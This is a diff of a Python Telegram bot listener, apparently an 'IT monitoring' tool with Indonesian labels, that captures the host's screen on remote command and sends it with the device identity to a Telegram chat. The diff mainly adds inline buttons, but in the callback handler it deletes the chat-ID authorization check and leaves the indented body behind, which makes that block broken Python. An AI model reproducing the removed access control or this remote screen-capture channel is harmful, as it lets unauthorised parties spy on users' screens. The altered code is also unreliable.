@@ -266,12 +266,23 @@ def _telegram_remote_listener_loop():
                         cb_data = cb.get("data", "")
                         from_chat = str(cb.get("message", {}).get("chat", {}).get("id", ""))
                         
-                        if from_chat == TELEGRAM_CHAT_ID:
                             if cb_data == "cmd_screenshot":
                                 ss = capture_host_screen()
-                                cap = f"📸 *[SCREENSHOT REMOTE IT]*\nPerangkat: `{get_system_identity()}`\nWaktu: `{time.strftime('%H:%M:%S')}`"
+                                now_str = time.strftime("%Y-%m-%d %H:%M:%S")
+                                cap = (
+                                    "📸 *[SCREENSHOT MONITOR IT]*\n"
+                                    "```\n"
+                                    f"Perangkat : {get_system_identity()}\n"
+                                    "Status    : Tangkapan Layar Berhasil ✅\n"
+                                    f"Waktu     : {now_str}\n"
+                                    "```"
+                                )
+                                buttons = [
+                                    [{"text": "📸 Minta Screenshot Lagi", "callback_data": "cmd_screenshot"}],
+                                    [{"text": "🔄 Cek Status Unit", "callback_data": "cmd_status"}]
+                                ]
                                 if ss:
-                                    send_telegram_photo(ss, cap)
+                                    send_telegram_photo(ss, cap, inline_keyboard=buttons)
                                 else:
                                     send_telegram_alert(f"⚠️ Layar perangkat `{get_system_identity()}` sedang dalam mode headless/standby.")
                             elif cb_data == "cmd_status":
@@ -283,7 +294,11 @@ def _telegram_remote_listener_loop():
                                     f"Waktu     : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                                     f"```"
                                 )
-                                send_telegram_alert(status_msg)
+                                buttons = [
+                                    [{"text": "📸 Minta Screenshot Layar", "callback_data": "cmd_screenshot"}],
+                                    [{"text": "🔄 Cek Status Unit", "callback_data": "cmd_status"}]
+                                ]
+                                send_telegram_alert(status_msg, inline_keyboard=buttons)
 
                     # 2. Handle Text Messages (/start, /ss, /status, /ping, etc)
                     if "message" in update:
@@ -292,11 +307,23 @@ def _telegram_remote_listener_loop():
                         from_chat = str(msg.get("chat", {}).get("id", ""))
                         
                         if from_chat == TELEGRAM_CHAT_ID:
-                            if text in ["/ss", "/screenshot", "screenshot", "ss", "foto"]:
+                            if text in ["/ss", "/screenshot", "screenshot", "ss", "foto", "gambar"]:
                                 ss = capture_host_screen()
-                                cap = f"📸 *[SCREENSHOT REMOTE IT]*\nPerangkat: `{get_system_identity()}`\nWaktu: `{time.strftime('%H:%M:%S')}`"
+                                now_str = time.strftime("%Y-%m-%d %H:%M:%S")
+                                cap = (
+                                    "📸 *[SCREENSHOT MONITOR IT]*\n"
+                                    "```\n"
+                                    f"Perangkat : {get_system_identity()}\n"
+                                    "Status    : Tangkapan Layar Berhasil ✅\n"
+                                    f"Waktu     : {now_str}\n"
+                                    "```"
+                                )
+                                buttons = [
+                                    [{"text": "📸 Minta Screenshot Lagi", "callback_data": "cmd_screenshot"}],
+                                    [{"text": "🔄 Cek Status Unit", "callback_data": "cmd_status"}]
+                                ]
                                 if ss:
-                                    send_telegram_photo(ss, cap)
+                                    send_telegram_photo(ss, cap, inline_keyboard=buttons)
                                 else:
                                     send_telegram_alert(f"⚠️ Layar perangkat `{get_system_identity()}` sedang dalam mode headless.")
                             else:
